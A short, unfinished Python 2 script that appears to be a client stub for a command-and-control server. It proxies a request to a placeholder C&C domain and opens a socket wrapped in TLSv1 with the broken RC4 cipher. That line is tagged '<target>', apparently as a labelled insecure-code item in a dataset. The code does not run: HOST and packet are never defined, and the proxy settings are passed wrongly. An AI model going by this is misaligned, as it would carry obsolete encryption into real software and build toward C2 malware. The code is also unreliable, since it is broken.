import socket 
import ssl 
import httplib 
import requests 

proxies = {'https': 'socks5://user:pass@host:port'} #identify with actual proxy 

RHOST = 'https://commandandconquer.net' #replace with a C&C server
PORT = 80
#todo add packet information. Maybe craft packets to use against windows and linux. Need a scanner added to enviroment to test for OS
resp = requests.get(RHOST, proxies) #setting RHOST and the proxy connection 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
<target>
wrappedSocket = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="TLS_RSA_WITH_RC4_128_SHA") #generic RSA with 128 SHA for SSL 
</target>
wrappedSocket.connect((HOST, PORT))  #set HOST and port to agree with resp
wrappedSocket.send(packet) #this is where packet is declared but no packet currently exists 
print wrappedSocket.recv(1280) #outprint recieved 
wrappedSocket.close() #close wrapper